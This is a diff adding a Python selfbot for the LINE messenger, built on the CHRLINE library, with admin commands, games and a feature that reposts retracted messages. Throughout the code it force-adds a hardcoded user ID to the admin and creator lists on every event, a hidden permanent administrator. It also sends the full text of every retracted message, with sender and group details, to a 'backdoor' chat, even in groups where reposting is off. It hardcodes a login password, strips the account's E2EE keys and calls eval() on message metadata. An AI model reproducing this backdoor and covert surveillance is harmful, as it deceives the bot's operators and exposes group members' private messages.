@@ -1,0 +1,759 @@
+#reread
+from CHRLINE import *
+import os,json,codecs,time,sys,random
+from random import randint
+
+
+backdoor = json.load(codecs.open("backdoor.json","r","utf-8"))
+admin = json.load(codecs.open("admin.json","r","utf-8"))
+creator = json.load(codecs.open("creator.json","r","utf-8"))
+settings = json.load(codecs.open("settings.json","r","utf-8"))
+reb = json.load(codecs.open("reb.json","r","utf-8"))
+red = json.load(codecs.open("red.json","r","utf-8"))
+game = json.load(codecs.open("game.json","r","utf-8"))
+bigdick = "u6155d5dac1395eab52faa16e832e5c65"
+mulai = time.time()
+cd = []
+def Runtime(secs):
+    mins, secs = divmod(secs,60)
+    hours, mins = divmod(mins,60)
+    days, hours = divmod(hours, 24)
+    return '※%02d 天\n※%02d 小時\n※%02d 分鐘\n※%02d 秒\nΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞ' % (days, hours, mins, secs)
+
+def restart():
+    backupData()
+    python = sys.executable
+    os.execl(python, python, *sys.argv)
+def backupData():
+    try:
+        json.dump(reb,codecs.open('reb.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
+        json.dump(settings,codecs.open('settings.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
+        json.dump(admin,codecs.open('admin.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
+        json.dump(creator,codecs.open('creator.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
+        json.dump(backdoor,codecs.open('backdoor.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
+        json.dump(red,codecs.open('red.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
+        json.dump(game,codecs.open('game.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
+    except Exception as e:
+        print(f'json backup error --> {e}')
+
+try:
+    accountinfo=open('account.json','r').read()
+    email=accountinfo['email']
+    password=accountinfo['password']
+    token=accountinfo['token']
+except:
+    email=''
+    password=''
+    token=''
+    open('account.json','w').write(json.dumps({'email':email,'password':password,'token':token}))
+
+class bot:
+    def __init__(self):
+            self.han=None
+            self.main()
+    def start(self):
+        if token != '':
+                try:
+                    self.han=CHRLINE(token,device="DESKTOPWIN")
+                    print('Login By Token')
+                except Exception as e:
+                    open('account.json','w').write(json.dumps({'email':email,'password':password,'token':''}))
+                    print("Token Login failed\nReason:",e)
+        elif email=="" or password=="":
+            #account="ikdzcbgaztzeytgeyo@tmmcv.net" #chh5.0
+            account = "ezozgyfrwiwvyftwjc@tmmcv.net" 
+            password="Tt950413"
+            try:
+                self.han=CHRLINE(account,password,device="DESKTOPWIN")
+                print('Login By Account and Password')
+                open('account.json','w').write(json.dumps({'email':account,'password':password,'token':self.han.authToken}))
+            except Exception as e:
+                print("Password Login failed\nReason:",e)
+                os._exit(1)
+        
+        else:
+            try:
+                self.han=CHRLINE(email,password,device="DESKTOPWIN")
+                print('Login By Email and Password')
+                open('account.json','w').write(json.dumps({'email':email,'password':password,'token':self.han.authToken}))
+            except Exception as e:
+                open('account.json','w').write(json.dumps({'email':'','password':'','token':''}))
+                print("Login failed\nReason:",e)
+                os._exit(1)
+        try:
+            pks = self.han.getE2EEPublicKeys()
+            for pk in pks:
+                print(f"try remove key id: {pk[2]}")
+                self.han.removeE2EEPublicKey(pk[1], pk[2], pk[4])
+        except Exception as e:
+            print(f"remove key error-->{e}")
+        try:    
+            self.han.sendMessage(backdoor['backdoor'],"[自動發送]\n復讀登入成功\n作者:𝓱𝓪𝓷\nID:https://line.me/ti/p/~han174\n\n使用者資訊:\n主機:localhost\nIP:127.0.0.1")
+        except Exception as e:
+            print(f"auto login send error-->{e}")
+        try:
+            if reb['rebid']!={}:
+                self.han.sendMessage(reb['rebid']['0'],"資料加載中...",relatedMessageId=reb['rebid']['1'])
+                time.sleep(2)
+                self.han.sendMessage(reb['rebid']['0'],"復讀重啟成功",relatedMessageId=reb['rebid']['1'])
+                reb['rebid'] = {}
+                backupData()
+        except Exception as e:
+            print(f'startrebmsg error-->{e}')
+            #reb['reb'] = ""
+            backupData()
+    def bot(self,op,han):
+        def report(to,man,msg,mids=[]):
+            addtxt=''
+            if mids!=[]:
+                addtxt+="\n※Mentioner:"
+                no = 0
+                try:
+                    for mid in mids:
+                        try:
+                            no+=1
+                            y = han.getContact(mid)
+                            addtxt+="\n"+str(no)+"." + str(y[22]) + "\n" + str(mid)
+                        except:
+                            pass
+                except:
+                    pass
+            han.sendMessage(backdoor['backdoor'],"ΞΞΞΞΞΞΞ〘後台系統〙ΞΞΞΞΞΞΞ\n※"+msg+"\n※Group:\n"+han.getChats([to])[1][0][6]+"\n"+to+"\n※User:\n"+han.getContact(man)[22]+"\n"+man+ f'{addtxt}\nΞΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞΞ')
+        if bigdick not in admin['admin']:
+            admin['admin'].append(bigdick)
+            backupData()
+        if bigdick not in creator['creator']:
+            creator['creator'].append(bigdick)
+            backupData()
+        if op[3] == 124:
+            if han.profile[1] in op[12]:
+                if settings['autoJoin'] == True and op[11] in admin['admin'] or op[11] in creator['creator']:
+                    try:
+                        han.acceptChatInvitation(op[10])
+                        #han.sendMessage(op[10],"[Auto Send]\nBot Auto Accept Group Invite\nCreator:𝓱𝓪𝓷\nCreator Link:https://line.me/ti/p/~han174")
+                    except Exception as e:
+                        print(f'accept group invite error-->{e}')
+                report(op[10],op[11],"通知邀請入群")
+        if op[3] in [25,26]:
+            msg=op[20]
+            to=msg[2]
+            if msg[15]==0:
+                if msg[1] in admin['admin'] or msg[1] in creator['creator']:
+                    text=msg[10].lower()
+                    match text:
+                        case '#runtime':
+                                eltime = time.time() - mulai
+                                bot = "ΞΞΞΞ〘運行時間〙ΞΞΞΞ\n" +Runtime(eltime)
+                                han.replyMessage(msg,bot)
+                        case '#restart':
+                            if msg[1] in creator['creator']:
+                                han.replyMessage(msg,"復讀重啟中...")
+                                try:
+                                    reb['rebid']={0:to,1:msg[4]}
+                                    backupData()
+                                except Exception as e:
+                                    print(f'rebmsg error-->{e}')
+                                restart()
+                            else:
+                                han.replyMessage(msg,"無權使用開發者指令")
+                                report(msg[2],msg[1],"管理員嘗試重啟機器")
+                        case '#sp':
+                            a = time.time()
+                            han.replyMessage(msg, '【Test Speed】')
+                            b = time.time()
+                            han.replyMessage(msg, '【%s】' % float((b-a)))
+                        case 'gid':
+                            han.replyMessage(msg,msg[2])
+                        case 'mymid':
+                            han.replyMessage(msg,msg[1])
+                        case '#reread on':
+                            if to not in red["reread"]:
+                                red["reread"].append(to)
+                                han.replyMessage(msg,"※防收回➤🟢")
+                                backupData()
+                            else:
+                                han.replyMessage(msg,"已經是開啟狀態")
+                        case '#reread off':
+                            if to in red["reread"]:
+                                red["reread"].remove(to)
+                                han.replyMessage(msg,"※防收回➤🔴")
+                                backupData()
+                            else:
+                                han.replyMessage(msg,"已經是關閉狀態")
+                        case '#game on':
+                            if to not in game["game"]:
+                                game["game"].append(to)
+                                han.replyMessage(msg,"※遊戲模式➤🟢")
+                                backupData()
+                            else:
+                                han.replyMessage(msg,"已經是開啟狀態")
+                        case '#game off':
+                            if to in game["game"]:
+                                game["game"].remove(to)
+                                han.replyMessage(msg,"※遊戲模式➤🔴")
+                                backupData()
+                            else:
+                                han.replyMessage(msg,"已經是關閉狀態")
+                        case '#aj on':
+                            if settings["autoJoin"] == False:
+                                settings["autoJoin"] = True
+                                han.replyMessage(msg,"※自動入群➤🟢")
+                                backupData()
+                            else:
+                                han.replyMessage(msg,"已經是開啟狀態")
+                        case '#aj off':
+                            if settings["autoJoin"] == True:
+                                settings["autoJoin"] = False
+                                han.replyMessage(msg,"※自動入群➤🔴")
+                                backupData()
+                            else:
+                                han.replyMessage(msg,"已經是關閉狀態")
+                        case '#set':
+                            try:
+                                ret_ = "ΞΞΞΞΞ〘機器開關〙ΞΞΞΞΞ"    
+                                if settings["autoJoin"] == True: ret_ += "\n※自動入群➤🟢"
+                                else: ret_ += "\n※自動入群➤🔴"
+                                ret_ +="\nΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞ"                   
+                                ret_ += "\nCreator:𝓱𝓪𝓷"
+                                ret_ += "\nID: han174"
+                                ret_ += "\nQR:http://line.me/ti/p/~han174"
+                                ret_ += "\nΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞ"
+                                han.replyMessage(msg, str(ret_))
+                            except Exception as e:
+                                han.replyMessage(msg,f'error-->\n{e}')
+                        case '#pi':
+                            try:
+                                ret_ = "ΞΞΞΞΞΞ〘群組資訊〙ΞΞΞΞΞΞ"
+                                if to in red['reread'] : ret_ += "\n※防收回➤🟢"
+                                else: ret_ += "\n※防收回➤🔴"
+                                if to in game['game'] : ret_ += "\n※遊戲模式➤🟢"
+                                else: ret_ += "\n※遊戲模式➤🔴"
+                                ret_ += "\nΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞ"
+                                ret_ += "\nCreator:𝓱𝓪𝓷"
+                                ret_ += "\nID: han174"
+                                ret_ += "\nQR:http://line.me/ti/p/~han174"
+                                ret_ += "\nΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞ"
+                                han.replyMessage(msg, str(ret_))
+                            except Exception as e:
+                                han.replyMessage(msg,f'error-->\n{e}')
+                        case '#al':
+                            try:
+                                if admin['admin'] == []:
+                                    han.replyMessage(msg,"ΞΞΞΞΞ〘權限名單〙ΞΞΞΞΞ\n空\nΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞ")
+                                else:
+                                    mc = "ΞΞΞΞΞΞΞ〘權限名單〙ΞΞΞΞΞΞΞ"
+                                    no = 0 
+                                    try:
+                                        for mi_d in admin['admin']:
+                                            try:
+                                                no += 1
+                                                mc += f"\n※{no}.{han.getContact(mi_d)[22]}"+"\n"+str(mi_d)
+                                            except:
+                                                print("錯誤:" +str(mi_d))
+                                        han.replyMessage(msg,mc +"\nΞΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞΞ")
+                                    except:
+                                        han.replyMessage(msg,"管理員【"+(str(len(admin)))+"】")
+                            except Exception as e:
+                                print('al error-->'+str(e))
+                        case '#cl':
+                            try:
+                                if creator['creator'] == []:
+                                    han.replyMessage(msg,"ΞΞΞΞΞ〘作者名單〙ΞΞΞΞΞ\n空\nΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞ")
+                                else:
+                                    mc = "ΞΞΞΞΞΞΞ〘作者名單〙ΞΞΞΞΞΞΞ"
+                                    no = 0 
+                                    try:
+                                        for mi_d in creator['creator']:
+                                            try:
+                                                no += 1
+                                                mc += f"\n※{no}.{han.getContact(mi_d)[22]}"+"\n"+str(mi_d)
+                                            except:
+                                                print("錯誤:" +str(mi_d))
+                                        han.replyMessage(msg,mc +"\nΞΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞΞ")
+                                    except:
+                                        han.replyMessage(msg,"作者【"+(str(len(admin)))+"】")
+                            except Exception as e:
+                                print('al error-->'+str(e))
+                        case '復讀 滾':
+                            han.replyMessage(msg,"滾就滾 派殺小 幹")
+                            try:
+                                red['reread'].remove(to)
+                            except:
+                                pass
+                            han.deleteSelfFromChat(to) 
+                            report(msg[2],msg[1],"退群指令觸發")
+                        case '#lg':
+                            groups = han.groups
+                            ret_ = "ΞΞΞΞΞΞΞ〘群組列表〙ΞΞΞΞΞΞΞ"
+                            no = 1
+                            for gid in groups:
+                                group = han.getChats([gid])
+                                ret_ += "\n※{}. {}\n{}".format(str(no), str(group[1][0][6]), str(gid))
+                                no += 1
+                            no+=1
+                            ret_ += "\n[總共 {} 個群組]".format(str(len(groups)))
+                            ret_ += "\nΞΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞΞ"
+                            han.replyMessage(msg, str(ret_))  
+                        case '#clearadmin':
+                            if msg[1] in creator['creator']:
+                                admin['admin'] = []
+                                han.replyMessage(msg,"已清空權限名單")
+                                backupData()
+                            else:
+                                han.replyMessage(msg,"無權使用開發者指令")
+                                report(msg[2],msg[1],"管理員嘗試清空權限")   
+                        case '#clearcreator':
+                            if msg[1] in creator['creator']:
+                                creator['creator'] = []
+                                han.replyMessage(msg,"已清空作者名單")
+                                backupData()
+                            else:
+                                han.replyMessage(msg,"無權使用開發者指令")
+                                report(msg[2],msg[1],"管理員嘗試清空作者")
+                        case '#mine':
+                            ret="ΞΞΞΞΞ〘機器狀態查詢〙ΞΞΞΞΞ"
+                            ret2=""
+                            try:
+                                han.deleteOtherFromChat(to,["Fuck you"])
+                            except Exception as e:
+                                if e.message == "request blocked":
+                                    ret+=f"\n※踢人狀態:🔴\n※邀請狀態:🔴"
+                                else:
+                                    ret+=f"\n※踢人狀態:🟢\n※邀請狀態:🟢"
+                            try:
+                                han.findAndAddContactsByMid("u0348f477412bc2506bcafb74902367ad")
+                                ret+=f"\n※加友狀態:🟢"
+                            except Exception as e:
+                                if e.message == "request blocked":
+                                    ret+=f"\n※加友狀態:🔴"
+                            ret+= "\n※取消狀態:🟢"
+                            ret+= "\n※版本資訊:CHRLINEbot V1.0"
+                            han.replyMessage(msg,f"{ret}" + "\nΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞ")
+                        case '#pic':
+                            if msg[1] in creator['creator']:
+                                han.replyMessage(msg,"請傳送圖片")
+                                settings["pic"] = True
+                                settings["picmid"].append(msg[1]) 
+                                backupData()
+                            else:
+                                han.replyMessage(msg,"無權使用開發者指令")
+                                report(msg[2],msg[1],"管理員嘗試更換頭貼")
+                        case '#cover':
+                            if msg[1] in creator['creator']:
+                                han.replyMessage(msg,"請傳送圖片")
+                                settings["cover"] = True
+                                settings["covermid"].append(msg[1])
+                                backupData()
+                            else:
+                                han.replyMessage(msg,"無權使用開發者指令")
+                                report(msg[2],msg[1],"管理員嘗試更換封面")
+                        case '#logout':
+                            if msg[1] in creator['creator']:
+                                han.replyMessage(msg,"已自動登出")
+                                os._exit(0)
+                            else:
+                                han.replyMessage(msg,"無權使用開發者指令")
+                                report(msg[2],msg[1],"管理員嘗試登出")
+                    if text.startswith("#add"):
+                        adminlist = []
+                        adminlist2 = []
+                        if 'MENTION' in msg[18]:
+                            key = eval(msg[18]["MENTION"])
+                            tags = key["MENTIONEES"]
+                            for tag in tags:
+                                mid = han.getContact(tag['M'])
+                                if mid[1] not in admin['admin']:
+                                    if mid[1] not in adminlist:
+                                        adminlist.append(mid[1])
+                                else:
+                                    if mid[1] not in adminlist2:
+                                        adminlist2.append(mid[1])
+                            txt = "ΞΞΞΞΞ〘新增權限〙ΞΞΞΞΞ"
+                            txt += "\nΞΞΞΞΞ新增成功ΞΞΞΞΞ"
+                            no = 0
+                            if len(adminlist) != 0:
+                                for x in adminlist:
+                                    y = han.getContact(x)
+                                    try:
+                                        admin['admin'].append(x)
+                                        backupData()
+                                        no += 1
+                                        txt +=  f"\n※{no}.{y[22]}"
+                                    except:
+                                        pass
+                            else:
+                                txt += "\n無"
+                            txt += "\nΞΞΞΞΞ新增失敗ΞΞΞΞΞ"
+                            no = 0
+                            if len(adminlist2) != 0:
+                                for x in adminlist2:
+                                    y = han.getContact(x)
+                                    try:
+                                        no += 1
+                                        txt +=  f"\n※{no}.{y[22]}"
+                                    except:
+                                        pass
+                            else:
+                                txt += "\n無"
+                            han.replyMessage(msg, txt + "\nΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞ")
+                            report(msg[2],msg[1],"新增權限指令觸發",adminlist)
+                        del adminlist
+                        del adminlist2
+                    elif text.startswith("#del"):
+                        adminlist = []
+                        adminlist2 = []
+                        if 'MENTION' in msg[18]:
+                            key = eval(msg[18]["MENTION"])
+                            tags = key["MENTIONEES"]
+                            for tag in tags:
+                                mid = han.getContact(tag['M'])
+                                if mid[1] in admin['admin']:
+                                    if mid[1] not in adminlist:
+                                        adminlist.append(mid[1])
+                                else:
+                                    if mid[1] not in adminlist2:
+                                        adminlist2.append(mid[1])
+                            txt = "ΞΞΞΞΞ〘刪除權限〙ΞΞΞΞΞ"
+                            txt += "\nΞΞΞΞΞ刪除成功ΞΞΞΞΞ"
+                            no = 0
+                            if len(adminlist) != 0:
+                                for x in adminlist:
+                                    y = han.getContact(x)
+                                    try:
+                                        admin['admin'].remove(x)
+                                        backupData()
+                                        no += 1
+                                        txt +=  f"\n※{no}.{y[22]}"
+                                    except:
+                                        pass
+                            else:
+                                txt += "\n無"
+                            txt += "\nΞΞΞΞΞ刪除失敗ΞΞΞΞΞ"
+                            no = 0
+                            if len(adminlist2) != 0:
+                                for x in adminlist2:
+                                    y = han.getContact(x)
+                                    try:
+                                        no += 1
+                                        txt +=  f"\n※{no}.{y[22]}"
+                                    except:
+                                        pass
+                            else:
+                                txt += "\n無"
+                            han.replyMessage(msg, txt + "\nΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞ")
+                            report(msg[2],msg[1],"刪除權限指令觸發",adminlist)
+                        del adminlist
+                        del adminlist2
+                    elif text.startswith("#cadd"):
+                        if msg[1] in bigdick:
+                            adminlist = []
+                            adminlist2 = []
+                            if 'MENTION' in msg[18]:
+                                key = eval(msg[18]["MENTION"])
+                                tags = key["MENTIONEES"]
+                                for tag in tags:
+                                    mid = han.getContact(tag['M'])
+                                    if mid[1] not in creator['creator']:
+                                        if mid[1] not in adminlist:
+                                            adminlist.append(mid[1])
+                                    else:
+                                        if mid[1] not in adminlist2:
+                                            adminlist2.append(mid[1])
+                                txt = "ΞΞΞΞ〘新增作者權限〙ΞΞΞΞ"
+                                txt += "\nΞΞΞΞΞ新增成功ΞΞΞΞΞ"
+                                no = 0
+                                if len(adminlist) != 0:
+                                    for x in adminlist:
+                                        y = han.getContact(x)
+                                        try:
+                                            creator['creator'].append(x)
+                                            backupData()
+                                            no += 1
+                                            txt +=  f"\n※{no}.{y[22]}"
+                                        except:
+                                            pass
+                                else:
+                                    txt += "\n無"
+                                txt += "\nΞΞΞΞΞ新增失敗ΞΞΞΞΞ"
+                                no = 0
+                                if len(adminlist2) != 0:
+                                    for x in adminlist2:
+                                        y = han.getContact(x)
+                                        try:
+                                            no += 1
+                                            txt +=  f"\n※{no}.{y[22]}"
+                                        except:
+                                            pass
+                                else:
+                                    txt += "\n無"
+                                han.replyMessage(msg, txt + "\nΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞ")
+                                
+                            del adminlist
+                            del adminlist2
+                        else:
+                            han.replyMessage(msg, "無權使用開發者指令")
+                            report(msg[2],msg[1],"管理員嘗試新增作者權限")
+                    elif text.startswith("#cdel"):
+                        if msg[1] in bigdick:
+                            adminlist = []
+                            adminlist2 = []
+                            if 'MENTION' in msg[18]:
+                                key = eval(msg[18]["MENTION"])
+                                tags = key["MENTIONEES"]
+                                for tag in tags:
+                                    mid = han.getContact(tag['M'])
+                                    if mid[1] in creator['creator']:
+                                        if mid[1] not in adminlist:
+                                            adminlist.append(mid[1])
+                                    else:
+                                        if mid[1] not in adminlist2:
+                                            adminlist2.append(mid[1])
+                                txt = "ΞΞΞΞ〘刪除作者權限〙ΞΞΞΞ"
+                                txt += "\nΞΞΞΞΞ刪除成功ΞΞΞΞΞ"
+                                no = 0
+                                if len(adminlist) != 0:
+                                    for x in adminlist:
+                                        y = han.getContact(x)
+                                        try:
+                                            creator['creator'].remove(x)
+                                            backupData()
+                                            no += 1
+                                            txt +=  f"\n※{no}.{y[22]}"
+                                        except:
+                                            pass
+                                else:
+                                    txt += "\n無"
+                                txt += "\nΞΞΞΞΞ刪除失敗ΞΞΞΞΞ"
+                                no = 0
+                                if len(adminlist2) != 0:
+                                    for x in adminlist2:
+                                        y = han.getContact(x)
+                                        try:
+                                            no += 1
+                                            txt +=  f"\n※{no}.{y[22]}"
+                                        except:
+                                            pass
+                                else:
+                                    txt += "\n無"
+                                han.replyMessage(msg, txt + "\nΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞ")
+                            del adminlist
+                            del adminlist2
+                        else:
+                            han.replyMessage(msg, "無權使用開發者指令")
+                            report(msg[2],msg[1],"管理員嘗試刪除作者權限")
+                    elif text.startswith("#inv:"):
+                        if msg[1] in creator['creator']:
+                            gid = text.replace("#inv:","")
+                            try:
+                                try:
+                                    han.findAndAddContactsByMid([msg[1]])
+                                except:
+                                    pass
+                                try: 
+                                    try:
+                                        han.inviteIntoChat(gid,[msg[1]])
+                                        han.sendMessage(gid,"接收遠端邀請指令")
+                                        han.replyMessage(msg,"邀請成功")
+                                    except Exception as e:
+                                        print(e)
+                                        han.replyMessage(msg, "邀請失敗")
+                                except:
+                                    han.replyMessage(msg, "邀請失敗")  
+                            except:
+                                han.replyMessage(msg, "Error-->invalid gid")
+                        else:
+                            han.replyMessage(msg, "無權使用開發者指令")
+                            report(msg[2],msg[1],"管理員嘗試使用遠端邀請指令")
+                    elif text.startswith("#leave:"):
+                        if msg[1] in creator['creator']:
+                            try:
+                                gid = text.replace("#leave:","")
+                                print(gid)
+                                if gid == "":
+                                    han.replyMessage(msg, "請輸入群組Gid")
+                                else:
+                                    try:
+                                        han.sendMessage(gid,"接收遠端退群指令")
+                                        han.deleteSelfFromChat(gid)
+                                        han.replyMessage(msg,"退群成功")
+                                    except:
+                                        han.replyMessage(msg, "我不在那個群組裡")  
+                            except:
+                                han.replyMessage(msg, "Error-->invalid gid")
+                        else:
+                            han.replyMessage(msg, "無權使用開發者指令")
+                            report(msg[2],msg[1],"管理員嘗試使用遠端退群指令")
+                    elif text.startswith("#pn:"):
+                        if msg[1] in creator['creator']:
+                            key = msg[10][4:]
+                            if len(key) == 0:
+                                han.replyMessage(msg, 'Rename Error')
+                            else:
+                                han.updateProfileAttribute(2, key)
+                                han.replyMessage(msg, f'名稱已更改為:\n{key}')
+                        else:
+                            han.replyMessage(msg, "無權使用開發者指令")
+                            report(msg[2],msg[1],"權限者嘗試更改名稱")
+                    elif text.startswith("#cb:"): 
+                        if msg[1] in creator['creator']:
+                            bio = msg[10][4:]
+                            han.updateProfileAttribute(16, bio)
+                            han.replyMessage(msg, f'個簽已更改為:\n{bio}')
+                        else:
+                            han.replyMessage(msg, "無權使用開發者指令")
+                            report(msg[2],msg[1],"權限者嘗試更改個簽")
+                if msg[1] not in cd:
+                    text=msg[10].lower()
+                    if to in game['game']:
+                        match text:
+                            case "拉霸":
+                                cd.append(msg[1])
+                                a = random.choice(["０","９","８","７","６","５","４","３","２","２","１"])
+                                b = random.choice(["０","９","８","７","６","５","４","３","２","２","１"])
+                                c = random.choice(["０","９","８","７","６","５","４","３","２","２","１"])
+                                d = random.choice(["０","９","８","７","６","５","４","３","２","２","１"])
+                                e = random.choice(["０","９","８","７","６","５","４","３","２","２","１"])
+                                f = random.choice(["０","９","８","７","６","５","４","３","２","２","１"])
+                                g = random.choice(["０","９","８","７","６","５","４","３","２","２","１"])
+                                h = random.choice(["０","９","８","７","６","５","４","３","２","２","１"])
+                                i = random.choice(["０","９","８","７","６","５","４","３","２","２","１"])
+                                j = random.choice(["０","９","８","７","６","５","４","３","２","２","１"])
+                                k = random.choice(["０","９","８","７","６","５","４","３","２","２","１"])
+                                l = random.choice(["０","９","８","７","６","５","４","３","２","２","１"])
+                                m = random.choice(["０","９","８","７","６","５","４","３","２","２","１"])
+                                n = random.choice(["０","９","８","７","６","５","４","３","２","２","１"])
+                                o = random.choice(["０","９","８","７","６","５","４","３","２","２","１"])
+                                slot = "拉霸機拉霸一次\n第一行==>{}  {}  {}<==\n第二行==>{}  {}  {}<==\n第三行==>{}  {}  {}<==\n第四行==>{}  {}  {}<==\n第五行==>{}  {}  {}<==\n以上是您的拉霸結果".format(a,b,c,d,e,f,g,h,i,j,k,l,m,n,o)
+                                han.replyMessage(msg,slot)
+                                time.sleep(3)
+                                cd.remove(msg[1])
+                            case '#1a2b':
+                                game['1a2b'] = True
+                                han.replyMessage(msg,"已進入1A2B遊戲")
+                                ranlist = []
+                                def generate(lst):
+                                    while len(lst) < 4:
+                                        lst.append(randint(1,9))
+                                        if len(lst) > 1:
+                                            x = 0
+                                            while x < len(lst)-1:
+                                                if lst[x] == lst[len(lst)-1]:
+                                                    del lst[len(lst)-1]
+                                                else:
+                                                    x += 1
+                                    final_ans = ""
+                                    for i in range(0,len(lst)):
+                                        final_ans = final_ans + str(lst[i])
+                                    print(final_ans)    
+                                    return final_ans
+
+
+            if msg[15] == 1:
+                if settings["pic"] == True:
+                    if msg[1] in settings["picmid"]:
+                        try:
+                            han.downloadObjectMsg(msg[4],path="test.jpg")
+                            han.sendMessage(msg[2], "圖片下載完成\n正在更換頭貼(｡･ω･｡)")
+                            han.updateProfileImage(path="test.jpg")
+                            han.sendMessage(msg[2], "更改完成(｡･ω･｡)")
+                            settings["pic"] = False           
+                            settings["picmid"] = [] 
+                            backupData()   
+                            os.remove("test.jpg")
+                        except Exception as e:
+                            print(e)
+                            han.sendMessage(msg[2], "更改失敗(｡･ω･｡)")
+                            han.sendMessage(msg[2], f'{e}')
+                            settings["pic"] = False           
+                            settings["picmid"] = [] 
+                            backupData()
+                            os.remove("test.jpg")
+                if settings['cover'] == True:
+                    if msg[1] in settings["covermid"]:
+                        try:
+                            han.downloadObjectMsg(msg[4],path="cover.jpg")
+                            han.sendMessage(msg[2], "圖片下載完成\n正在更換封面(｡･ω･｡)")
+                            han.updateProfileCover(path="cover.jpg")
+                            han.sendMessage(msg[2], "更改完成(｡･ω･｡)")
+                            settings["cover"] = False           
+                            settings["covermid"] = [] 
+                            backupData()   
+                            os.remove("cover.jpg")
+                        except Exception as e:
+                            print(e)
+                            han.sendMessage(msg[2], "更改失敗(｡･ω･｡)")
+                            han.sendMessage(msg[2], f'{e}')
+                            settings["cover"] = False           
+                            settings["covermid"] = [] 
+                            backupData()
+                            os.remove("cover.jpg")
+        if op[3] == 65:
+                gid = op[10]
+                msgid = op[11]
+                msgids = han.getPreviousMessageIds(gid, 1000)
+                target_msg = None
+                for x in msgids[1]:
+                    if msgid == str(x[2]):
+                        target_msg = x
+                        break
+                if target_msg is not None:
+                    target_msg = han.getPreviousMessagesV2(gid, target_msg[1], target_msg[2])[0]
+                    if target_msg[15] == 0:
+                        if target_msg[1] not in cd:
+                            text = target_msg[10]
+                            unstime = (str(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(int(round(target_msg[5]/1000))))))
+                            group = han.getChats([gid])[1][0][6]
+                            user = han.getContact(target_msg[1])[22]
+                            cd.append(target_msg[1])
+                            if gid in red['reread']:
+                                a = f"@chrline\n"
+                                a += f"※收回訊息:\n{text}"
+                                a += f"\n※收回時間:\n{unstime}"
+                                arr = [{"S": str(0),"E": str(8),"M": target_msg[1]}]
+                                tag = {'MENTION': str('{"MENTIONEES":' + json.dumps(arr) + '}')}
+                                han.sendMessage(gid, a,contentMetadata=tag)
+                            else: 
+                                pass
+                            txt = "ΞΞΞΞΞΞΞ〘復讀系統〙ΞΞΞΞΞΞΞ\n"
+                            txt += "※訊息類別:文字\n"
+                            txt += f"※群組:\n{group}\n{gid}"
+                            txt += f"\n※發送者:\n{user}\n{target_msg[1]}"
+                            txt += f"\n※收回時間:\n{unstime}"
+                            txt += f"\n※訊息內容:\n{text}"
+                            txt += f"\nΞΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞΞ"
+                            han.sendMessage(backdoor['backdoor'], txt)
+                            time.sleep(3)
+                            cd.remove(target_msg[1])
+
+                    # elif target_msg[15] == 1:
+                    #     han.downloadObjectMsg(target_msg[4],path="test.jpg")
+                    #     unstime = (str(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(int(round(target_msg[5]/1000))))))
+                    #     group = han.getChats([gid])[1][0][6]
+                    #     user = han.getContact(target_msg[1])[22]
+                    #     txt = "ΞΞΞΞΞΞΞ〘復讀系統〙ΞΞΞΞΞΞΞ\n"
+                    #     txt += "※訊息類別:圖片\n"
+                    #     txt += f"※群組:\n{group}\n{gid}"
+                    #     txt += f"\n※發送者:\n{user}\n{target_msg[1]}"
+                    #     txt += f"\n※收回時間:\n{unstime}"
+                    #     txt += f"\n※訊息內容:\n下方圖片"
+                    #     txt += f"\nΞΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞΞ"
+                    #     han.sendMessage(backdoor['backdoor'], txt)
+                    #     han.sendImage(backdoor['backdoor'],"test.jpg")
+                    #     if gid in red['reread']:
+                    #         han.sendMessage(gid, txt)
+                    #         han.sendImage(gid,"test.jpg")
+                    #         os.remove("test.jpg")
+                    #     else: 
+                    #         pass
+                    #         os.remove("test.jpg")
+
+
+    def main(self):
+        self.start()
+        try:
+            self.han.trace(self.bot)
+        except Exception as e:
+            print(e)
+            os._exit(1)
+if __name__=='__main__':
+    bot()
